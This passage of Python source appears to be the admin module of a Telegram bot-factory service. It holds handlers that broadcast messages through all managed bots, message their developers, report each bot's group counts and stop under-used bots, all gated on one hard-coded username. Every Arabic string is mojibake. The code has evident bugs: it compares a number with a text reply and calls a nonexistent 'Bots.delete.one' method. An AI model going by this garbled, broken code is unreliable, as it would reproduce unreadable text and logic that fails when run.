                  else:
                    sc += 1
                  if pn.text == "Ù†Ø¹Ù…":
                    await m.pin(disable_notification=False)
               except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
               except Exception as e:
                    print(e)
                    continue
       except Exception as es:
           print(es)
           await message.reply_text(es)
   try:
      await message.reply_text(f"**ØªÙ… Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡ Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…ØµÙ†ÙˆØ¹Ø§Øª Ø¨Ù†Ø¬Ø§Ø­**\n**ØªÙ… Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… {b} Ø¨ÙˆØª**\n**Ø§Ù„ÙŠ {c} Ù…Ø¬Ù…ÙˆØ¹Ø© Ùˆ {u} Ù…Ø³ØªØ®Ø¯Ù…**\n**ØªÙ… Ø§Ù„Ø§Ø°Ø¹Ù‡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… {s} Ù…Ø³Ø§Ø¹Ø¯**\n**Ø§Ù„ÙŠ {sc} Ù…Ø¬Ù…ÙˆØ¹Ø© Ùˆ {su} Ù…Ø³ØªØ®Ø¯Ù…**")
   except Exception as es:
      await message.reply_text(es)


@app.on_message(filters.command(["âœ˜ Ø§Ø°Ø§Ø¹Ù‡ Ù„Ù„Ù…Ø·ÙˆØ±ÙŠÙ† âœ˜"], ""))
async def cast_dev(client, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
  ask = await client.ask(message.chat.id, "**Ù‚Ù… Ø¨Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡ Ø§Ù„Ø§Ù†**", timeout=30)
  if ask.text == "Ø§Ù„ØºØ§Ø¡":
      return await ask.reply_text("ØªÙ… Ø§Ù„Ø§Ù„ØºØ§Ø¡")
  d = 0
  f = 0
  bots = Bots.find({})
  for i in bots:
      try:
       dev = i["dev"]
       bot_username = i["bot_username"]
       bot = appp[bot_username]
       try: 
         await bot.send_message(dev, ask.text)
         d += 1
       except Exception as es:
        print(es)
        f += 1
      except Exception:
       f += 1
  return await ask.reply_text(f"**ØªÙ… Ø§Ù„Ø§Ø±Ø³Ø§Ù„ Ø§Ù„ÙŠ {d} Ù…Ø·ÙˆØ±\n**ÙˆÙØ´Ù„ Ø§Ù„Ø§Ø±Ø³Ø§Ù„ Ø§Ù„ÙŠ {f} Ù…Ø·ÙˆØ±**")



@app.on_message(filters.command(["âœ˜ ÙØ­Øµ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜"],""))
async def testbots(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   bots = Bots.find({})
   text = "Ø§Ù„ÙŠÙƒ Ø§Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø¨ÙˆØªØ§Øª"
   b = 0
   for i in bots:
       try:
        bot_username = i["bot_username"]
        database = mongodb[bot_username]
        chatsdb = database.chats
        g = len(await get_chats(chatsdb))
        b += 1
        text += f"\n**{b}- @{bot_username} Â» Gá–‡Oá‘Œá‘­âœ˜ : {g}**"
       except Exception as es:
          print(es)
   await message.reply_text(text)



@app.on_message(filters.command(["âœ˜ ØªØµÙÙŠÙ‡ Ø§Ù„Ø¨ÙˆØªØ§Øª âœ˜"],""))
async def checkbot(client: app, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   ask = await client.ask(message.chat.id, "**Ø§Ø±Ø³Ù„ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø§Ø¯Ù†ÙŠ Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª !**", timeout=30)
   if ask.text == "Ø§Ù„ØºØ§Ø¡":
      return await ask.reply_text("ØªÙ… Ø§Ù„Ø§Ù„ØºØ§Ø¡")
   bots = Bots.find({})
   text = f"ØªÙ… Ø§ÙŠÙ‚Ø§Ù Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙˆØªØ§Øª Ù„Ø§Ù† Ø§Ù„Ø§Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù‚Ù„ Ù…Ù† : {ask.text} Ù…Ø¬Ù…ÙˆØ¹Ø©"
   b = 0
   for i in bots:
       try:
        bot_username = i["bot_username"]
        database = mongodb[bot_username]
        chatsdb = database.chats
        g = len(await get_chats(chatsdb))
        if g < ask.text:
         b += 1
         boot = appp[bot_username]
         await boot.stop()
         Bots.delete.one({"bot_username": bot_username})
         text += f"\n**{b}- @{bot_username} Â» Gá–‡Oá‘Œá‘­âœ˜ : {g}**"
       except Exception as es:
          print(es)
   await message.reply_text(text)
        
